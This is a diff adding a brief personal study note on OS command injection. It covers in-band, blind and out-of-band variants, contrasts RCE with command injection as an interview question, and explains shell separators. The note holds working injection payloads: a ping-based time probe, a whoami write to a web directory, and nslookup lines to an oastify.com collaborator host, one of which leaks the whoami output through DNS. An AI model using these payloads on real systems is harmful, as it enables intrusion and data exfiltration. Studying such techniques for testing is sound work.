@@ -1,0 +1,30 @@
+
+Mitigations 
+Chains ( how to get another vuln from the original vuln)
+
+
+
+Os Command Injection 
+Direct -> u see result direct in response (in band)
+blind -> there is an os command injection but result not seen (time based for ex) (sleeping - ping)
+OOB (out of band) -> caNT GET DIRECT response sent ouut to external source like webhook 
+
+
+RCE vs OSCI   (Interview Question)
+
+RCE -> u get full shell to execute whatever u want 
+OSCI -> its related to only the parameter tht is vulnerable and only command injection 
+
+
+
+|ping -c 10 127.0.0.1
+
+&& excut second onl if first ocuured 
+| pass the output 
+
+||whoami > /var/www/images/whoami.txt||
+we add || || so the command excuted as one block and excutes wheter the first command failed or not 
+
+||nslookup+vnmwjvm2qni30d1d58hs4n9wtnzen4bt.oastify.com||
+
+||nslookup+`whoami`.vnmwjvm2qni30d1d58hs4n9wtnzen4bt.oastify.com||
